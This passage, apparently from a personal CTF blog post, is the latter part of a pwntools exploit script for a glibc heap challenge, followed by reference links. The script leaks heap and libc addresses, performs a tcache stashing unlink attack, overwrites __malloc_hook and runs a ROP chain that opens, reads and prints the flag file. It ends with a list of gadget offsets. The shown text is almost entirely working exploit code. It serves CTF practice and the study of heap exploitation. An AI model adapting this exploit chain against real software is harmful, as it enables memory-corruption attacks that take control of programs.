</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>6</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>debut</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mh>0x80</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>retire</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># leak heap base</span>
</span></span><span class=line><span class=cl>    <span class=n>debut</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mh>0x80</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>retire</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>show</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;hero name: &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>heap_base</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span><span class=o>.</span><span class=n>strip</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>))</span> <span class=o>&amp;</span> <span class=p>(</span><span class=o>~</span><span class=mh>0xfff</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>pf</span><span class=p>(</span><span class=s2>&#34;heap base&#34;</span><span class=p>,</span> <span class=n>heap_base</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># leak libc base</span>
</span></span><span class=line><span class=cl>    <span class=n>debut</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mh>0x80</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>debut</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mh>0x80</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>retire</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>show</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;hero name: &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>libc_base</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span><span class=o>.</span><span class=n>strip</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>))</span> <span class=o>-</span> <span class=mh>0x3B3CA0</span>
</span></span><span class=line><span class=cl>    <span class=n>pf</span><span class=p>(</span><span class=s2>&#34;libc base&#34;</span><span class=p>,</span> <span class=n>libc_base</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># tcache stashing unlink attack</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>6</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>debut</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mh>0xf8</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>retire</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>7</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>debut</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mh>0x400</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>retire</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1># gdb.attach(io, &#34;b *$rebase(0x16AB)&#34;)</span>
</span></span><span class=line><span class=cl>    <span class=n>debut</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mh>0x400</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>debut</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mh>0x400</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>retire</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>debut</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mh>0x300</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>debut</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mh>0x400</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>debut</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mh>0x400</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>retire</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>debut</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mh>0x300</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>debut</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mh>0x200</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>rename</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mh>0x308</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x101</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>heap_base</span><span class=o>+</span><span class=mh>0x2d20</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>heap_base</span><span class=o>+</span><span class=mh>0x1f</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>debut</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;./flag&#34;</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0xf8</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>#</span>
</span></span><span class=line><span class=cl>    <span class=n>debut</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mh>0x217</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>debut</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mh>0x217</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>retire</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>retire</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>rename</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc_base</span><span class=o>+</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s2>&#34;__malloc_hook&#34;</span><span class=p>]))</span>
</span></span><span class=line><span class=cl>    <span class=n>backdoor</span><span class=p>(</span><span class=s2>&#34;A&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>backdoor</span><span class=p>(</span><span class=n>p64</span><span class=p>(</span><span class=n>libc_base</span><span class=o>+</span><span class=mh>0xbdfd1</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=c1># rop</span>
</span></span><span class=line><span class=cl>    <span class=n>poprdi</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=mh>0x219c0</span>
</span></span><span class=line><span class=cl>    <span class=n>poprsi</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=mh>0x24435</span>
</span></span><span class=line><span class=cl>    <span class=n>poprdx</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=mh>0x1b9a</span>
</span></span><span class=line><span class=cl>    <span class=n>poprax</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=mh>0x37fa8</span>
</span></span><span class=line><span class=cl>    <span class=n>syscall</span><span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=n>g</span><span class=p>(</span><span class=s2>&#34;syscall; ret&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>## open</span>
</span></span><span class=line><span class=cl>    <span class=n>rops</span>  <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>poprdi</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>heap_base</span><span class=o>+</span><span class=mh>0x2d30</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>rops</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>poprsi</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>rops</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>poprdx</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>rops</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>poprax</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>rops</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>syscall</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>## read</span>
</span></span><span class=line><span class=cl>    <span class=n>rops</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>poprdi</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>rops</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>poprsi</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>heap_base</span><span class=o>+</span><span class=mh>0x2d30</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>rops</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>poprdx</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>20</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>rops</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>poprax</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>rops</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>syscall</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>## write</span>
</span></span><span class=line><span class=cl>    <span class=n>rops</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>poprdi</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>rops</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>poprsi</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>heap_base</span><span class=o>+</span><span class=mh>0x2d30</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>rops</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>poprdx</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>20</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>rops</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>poprax</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>rops</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>syscall</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># gdb.attach(io, &#34;&#34;&#34;b *$rebase(0x16AB)</span>
</span></span><span class=line><span class=cl>    <span class=c1># b *$rebase(0x139C)</span>
</span></span><span class=line><span class=cl>    <span class=c1># &#34;&#34;&#34;)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>debut</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>rops</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x80</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>argc</span> <span class=o>=</span> <span class=nb>len</span><span class=p>(</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>argc</span> <span class=o>==</span> <span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=n>localfile</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>argc</span> <span class=o>==</span> <span class=mi>2</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>host</span><span class=p>,</span> <span class=n>port</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;:&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=n>argc</span> <span class=o>==</span> <span class=mi>3</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>host</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>port</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=n>host</span><span class=p>,</span> <span class=n>port</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=n>localfile</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=n>locallibc</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>exp</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>0x00000000000bdfd1 : add rsp, 0x48 ; ret
</span></span></span><span class=line><span class=cl><span class=s2>0x00000000000219c0 : pop rdi ; ret
</span></span></span><span class=line><span class=cl><span class=s2>0x0000000000024435 : pop rsi ; ret
</span></span></span><span class=line><span class=cl><span class=s2>0x0000000000001b9a : pop rdx ; ret
</span></span></span><span class=line><span class=cl><span class=s2>0x0000000000037fa8 : pop rax ; ret
</span></span></span><span class=line><span class=cl><span class=s2>0x000000000000275b : syscall
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=reference>reference<a hidden class=anchor aria-hidden=true href=#reference>#</a></h2><ol><li>how2heap tcache_stashing_unlink_attack.c</li><li><a href=https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/tcache_attack-zh/#challenge-4-hitcon-2019-one_punch_man>https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/tcache_attack-zh/#challenge-4-hitcon-2019-one_punch_man</a></li><li><a href=https://qianfei11.github.io/2020/05/05/Tcache-Stashing-Unlink-Attack/#Tcache-Stashing-Unlink-Attack-Plus>https://qianfei11.github.io/2020/05/05/Tcache-Stashing-Unlink-Attack/#Tcache-Stashing-Unlink-Attack-Plus</a></li></ol></div><footer class=post-footer><ul class=post-tags><li><a href=https://hhdx.xyz/tags/ctf/>CTF</a></li><li><a href=https://hhdx.xyz/tags/how2heap/>How2heap</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://hhdx.xyz/>hhdx's blog</a></span> Â·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>